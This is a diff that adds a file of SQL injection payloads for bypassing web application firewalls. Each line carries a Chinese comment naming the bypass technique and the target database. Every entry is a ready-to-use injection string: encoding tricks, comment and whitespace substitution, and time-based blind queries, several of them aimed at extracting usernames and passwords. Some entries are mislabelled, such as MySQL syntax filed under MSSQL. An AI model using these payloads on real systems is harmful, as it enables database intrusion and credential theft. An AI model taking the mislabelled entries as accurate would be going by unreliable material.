@@ -1,0 +1,32 @@
+# WAF SQLi 绕过 - MSSQL 注释替代空格
+'/**/UNION/**/SELECT/**/1,user(),version(),4,5/**/FROM/**/mysql.user--
+# WAF SQLi 绕过 - MSSQL 括号绕过空格
+1=(SELECT(1)FROM(master..sysdatabases)WHERE(name LIKE'%'))
+# WAF SQLi 绕过 - MSSQL 十六进制编码绕过字符串检测
+1 UNION SELECT 0x730065006C00650063007400 FROM master..sysdatabases--
+# WAF SQLi 绕过 - MySQL 反引号绕过关键字
+1%60UNION%60SELECT%601,user(),3%60FROM%60mysql.user%60--
+# WAF SQLi 绕过 - PostgreSQL 类型转换绕过 UNION 检测
+1 UNION SELECT NULL::text,current_database()::text,3--
+# WAF SQLi 绕过 - PostgreSQL $$ 引用绕过引号检测
+1 UNION SELECT $$tablename$$,2,3 FROM information_schema.tables--
+# WAF SQLi 绕过 - MySQL 浮点数科学计数法绕过
+1.e(UNION)e(SELECT)e(1,2,3)e(FROM)e(dual)--
+# WAF SQLi 绕过 - MySQL /*!50000*/ 版本注释绕过
+'/*!50000UNION*//*!50000SELECT*/1,user(),version(),4,5/*!50000FROM*//*!50000mysql.user*/--
+# WAF SQLi 绕过 - Oracle ROWNUM 限制绕过
+' UNION SELECT username,password FROM all_users WHERE ROWNUM=1--
+# WAF SQLi 绕过 - MySQL 等价函数替换 (MID 替代 SUBSTRING)
+' AND IF(MID((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--
+# WAF SQLi 绕过 - MySQL BENCHMARK 替代 SLEEP 绕过延时检测
+' AND IF(1=1,BENCHMARK(50000000,MD5('x')),1)--
+# WAF SQLi 绕过 - MySQL 双 URL 编码绕过
+%25%32%37%25%32%30%25%35%35%25%34%65%25%34%39%25%34%66%25%34%65%25%32%30%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%33%31
+# WAF SQLi 绕过 - 换行符替换空格 (所有DB)
+1%0aUNION%0aSELECT%0a1,2,3%0aFROM%0adual--
+# WAF SQLi 绕过 - PostgreSQL CHR 替代引号
+1 UNION SELECT CHR(116)||CHR(97)||CHR(98)||CHR(108)||CHR(101),2,3--
+# WAF SQLi 绕过 - Oracle NVL 函数绕过空值检测
+' UNION SELECT NVL(username,'NULL'),NVL(password,'NULL') FROM all_users--
+# WAF SQLi 绕过 - 制表符 %09 混合注释绕过
+1%09UNION%09SELECT%09%09--%09%0a1,2,3%09--%09%0aFROM%09users--
